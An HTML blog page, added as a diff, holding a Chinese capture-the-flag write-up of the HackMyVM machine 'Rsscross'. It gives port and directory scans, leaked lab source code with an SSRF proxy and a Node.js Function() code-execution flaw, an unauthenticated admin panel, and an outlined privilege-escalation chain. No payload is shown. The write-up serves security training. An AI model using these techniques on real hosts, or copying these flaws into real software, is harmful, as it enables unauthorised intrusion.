@@ -1,0 +1,763 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Sweet dreams are made of this甜蜜的梦由此组成Who am I to disagree?我有何资格不附和Travel the world and the seven seas我环游世界和七大洋Everybody’s looking for something每个人皆有欲求  靶机ip：192.168.56.53 难度：高 涉及内容： 信息收集：目录爆破、敏感文件泄露（.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Rsscross">
+<meta property="og:url" content="http://example.com/2026/03/27/HackMyVM-Rsscross/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="Sweet dreams are made of this甜蜜的梦由此组成Who am I to disagree?我有何资格不附和Travel the world and the seven seas我环游世界和七大洋Everybody’s looking for something每个人皆有欲求  靶机ip：192.168.56.53 难度：高 涉及内容： 信息收集：目录爆破、敏感文件泄露（.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-03-27T11:45:29.000Z">
+<meta property="article:modified_time" content="2026-03-27T11:59:05.919Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HVM">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackMyVM-Rsscross - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackMyVM-Rsscross"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-27 19:45" pubdate>
+          March 27, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          34 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackMyVM-Rsscross</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Sweet dreams are made of this<br>甜蜜的梦由此组成<br>Who am I to disagree?<br>我有何资格不附和<br>Travel the world and the seven seas<br>我环游世界和七大洋<br>Everybody’s looking for something<br>每个人皆有欲求</p>
+<hr>
+<p>靶机ip：192.168.56.53</p>
+<p>难度：高</p>
+<p>涉及内容：</p>
+<p><strong>信息收集</strong>：目录爆破、敏感文件泄露（<code>.tar</code> 源码泄露）。</p>
+<p><strong>Web 漏洞利用</strong>：</p>
+<ul>
+<li>双重 URL 编码绕过 Apache 解析拦截。</li>
+<li>Server-Side Request Forgery (SSRF) 结合目录穿越。</li>
+<li>Node.js 危险函数 <code>Function()</code> 导致的动态代码执行（RCE）。</li>
+<li>利用 <code>String.fromCharCode</code> 绕过 HTML 实体转义 (<code>htmlspecialchars</code>) 及长度限制。</li>
+</ul>
+<p><strong>密码学与凭据收集</strong>：数据库配置审计、MD5 哈希爆破（识别 <code>echo</code> 默认追加换行符 <code>\n</code> 的实战陷阱）。</p>
+<p><strong>横向移动 (Lateral Movement)</strong>：利用 <code>sudo</code> 错误配置与 GTFOBins（<code>groff -U</code> 宏执行）提权至其他用户。</p>
+<p><strong>垂直提权 (Privilege Escalation)</strong>：</p>
+<ul>
+<li>文件权限配置不当（利用属组的写权限 <code>-rw-rw-r--</code>）。</li>
+<li>Python 模块劫持&#x2F;插件注入（篡改 <code>add_language.py</code>）结合 <code>sudo</code> 提权至 Root。</li>
+</ul>
+<hr>
+<p>端口扫描</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># nmap -p- 192.168.56.53</span><br>Starting Nmap <span class="hljs-number">7.98</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>3-<span class="hljs-number">26</span> <span class="hljs-number">23</span>:<span class="hljs-number">10</span> <span class="hljs-operator">-</span><span class="hljs-number">0400</span><br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">56.53</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">56.53</span>)<br>Host is up (<span class="hljs-number">0.00017</span>s latency).<br>Not <span class="hljs-params">shown:</span> <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT     STATE    SERVICE<br><span class="hljs-number">22</span><span class="hljs-symbol">/tcp</span>   open     ssh<br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>   open     http<br><span class="hljs-number">3000</span><span class="hljs-symbol">/tcp</span> filtered ppp<br>MAC <span class="hljs-params">Address:</span> <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">34</span>:<span class="hljs-number">78</span>:<span class="hljs-number">19</span> (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">5.01</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>目录爆破</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># dirsearch -u 192.168.56.53 -e tar,gz,php,js,html,htm,zip,7z,001,bak</span><br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>python3<span class="hljs-operator">/</span>dist-packages<span class="hljs-operator">/</span>dirsearch<span class="hljs-operator">/</span>dirsearch.py:<span class="hljs-number">23</span>: <span class="hljs-params">UserWarning:</span> pkg_resources is deprecated as an API. See https:<span class="hljs-symbol">//setuptools.pypa.io/en/latest/pkg_resources.html.</span> The pkg_resources package is slated for removal as early as <span class="hljs-number">202</span>5-<span class="hljs-number">1</span>1-<span class="hljs-number">30</span>. Refrain from using this package <span class="hljs-keyword">or</span> pin to Setuptools<span class="hljs-operator">&lt;</span><span class="hljs-number">81</span>.<br>  from pkg_resources <span class="hljs-built_in">import</span> DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                           <br> (_<span class="hljs-operator">||</span>| _) (<span class="hljs-operator">/</span>_(_<span class="hljs-operator">||</span> (_| )                                                                                                                                    <br>                                                                                                                                                           <br><span class="hljs-params">Extensions:</span> tar, gz, php, js, html, htm, zip, <span class="hljs-number">7</span>z, <span class="hljs-number">001</span>, bak | HTTP <span class="hljs-params">method:</span> GET | <span class="hljs-params">Threads:</span> <span class="hljs-number">25</span> | Wordlist <span class="hljs-params">size:</span> <span class="hljs-number">14081</span><br><br>Output <span class="hljs-params">File:</span> <span class="hljs-symbol">/home/kali/Desktop/reports/_192.168.56.53/_26-03-26_23-02-42.txt</span><br><br><span class="hljs-params">Target:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.53</span><span class="hljs-symbol">/</span><br><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">42</span>] <span class="hljs-params">Starting:</span>                                                                                                                                       <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/html.php</span>                                         <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.ht_wsr.txt</span>                                      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.bak1</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.orig</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.sample</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.save</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_extra</span>                                  <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_orig</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessBAK</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_sc</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD2</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htm</span>                                             <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.html</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswd_test</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswds</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.httr-oauth</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">44</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.php</span>                                             <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">46</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">314</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/admin</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.53</span><span class="hljs-operator">/</span>admin<span class="hljs-symbol">/</span>           <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">46</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>admin<span class="hljs-symbol">/</span>  <span class="hljs-operator">-&gt;</span>  article.manage.php                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">46</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/admin/index.php</span>  <span class="hljs-operator">-&gt;</span>  article.manage.php          <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">50</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">6</span>MB <span class="hljs-operator">-</span> <span class="hljs-symbol">/app.tar</span>                                          <br>[<span class="hljs-number">23</span>:<span class="hljs-number">02</span>:<span class="hljs-number">52</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">7</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/config.php</span>                                       <br>[<span class="hljs-number">23</span>:<span class="hljs-number">03</span>:<span class="hljs-number">04</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>server-status<span class="hljs-symbol">/</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">03</span>:<span class="hljs-number">04</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">278</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/server-status</span><br>                                                                             <br>Task Completed                                                   <br></code></pre></td></tr></table></figure>
+
+<p>app.tar泄露了网站源码。</p>
+<p>经过代码审计，主要突破点在以下几点。</p>
+<p>node.js以及GetRss&#x2F;index.php</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RSS</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;rss&#x27;</span>);<br><span class="hljs-keyword">const</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;request&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/api/:id&quot;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">var</span> link = <span class="hljs-string">`http://localhost/Rssinfo/index.php/<span class="hljs-subst">$&#123;req.params.id&#125;</span>`</span>;<br>    <span class="hljs-keyword">var</span> options = &#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;url&#x27;</span>: link,<br>        <span class="hljs-string">&#x27;headers&#x27;</span>: &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&quot;</span>,<br>        &#125;<br>    &#125;;<br>    <span class="hljs-title function_">request</span>(options, <span class="hljs-keyword">function</span> (<span class="hljs-params">error, response, body</span>) &#123;<br>        <span class="hljs-keyword">if</span> (error) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(error);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">Function</span>(<br>                body.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/var passage = \&#123;.*&#125;;/gm</span>)[<span class="hljs-number">0</span>]<br>                + <span class="hljs-string">&#x27;let json_data=JSON.parse(JSON.stringify(passage));&#x27;</span><br>                + <span class="hljs-string">&#x27;return json_data;&#x27;</span><br>            )();<br>            <span class="hljs-keyword">var</span> feed = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RSS</span>(data);<br>            <span class="hljs-keyword">var</span> xml = feed.<span class="hljs-title function_">xml</span>();<br>            res.<span class="hljs-title function_">contentType</span>(<span class="hljs-string">&#x27;application/xml&#x27;</span>);<br>            res.<span class="hljs-title function_">send</span>(xml)<br>        &#125;<span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        &#125;<br>    &#125;)<br>&#125;)<br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pathParts</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$pathParts</span>),ENT_QUOTES);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:application/xml;&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getrss</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getrss</span>(<span class="hljs-string">&quot;http://localhost:3000/api/&quot;</span>.<span class="hljs-variable">$id</span>);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>后台未授权访问</strong>：<code>/admin/</code> 目录下的 <code>article.manage.php</code> 和 <code>article.add.php</code> 没有任何身份校验，可以直接增删改文章。</p>
+<p><strong>过滤机制</strong>：后台对输入的参数使用了 <code>htmlspecialchars(..., ENT_QUOTES)</code> 进行全局转义，并且对 <code>title</code> 和 <code>author</code> 限制了最大长度 10 个字符，堵死了直接在此处进行传统 XSS 或代码注入的可能。但 <code>content</code> 字段没有长度限制。</p>
+<p><strong>SSRF 接口</strong>：前台 <code>/GetRss/index.php/</code> 存在一个 SSRF 漏洞，它会将 URL 最后的路径作为 <code>$id</code>，拼接到 <code>http://localhost:3000/api/</code> 后并使用 cURL 发起请求。</p>
+<p><strong>内部 Node.js 服务</strong>：3000 端口运行着一个 Express 服务，它会去请求本机的 <code>Rssinfo/index.php/id</code>，并通过正则表达式提取页面中的 <code>var passage = &#123;...&#125;;</code> 字符串，最后致命地使用了 <code>Function()()</code> 动态执行这段提取出的字符串。</p>
+</blockquote>
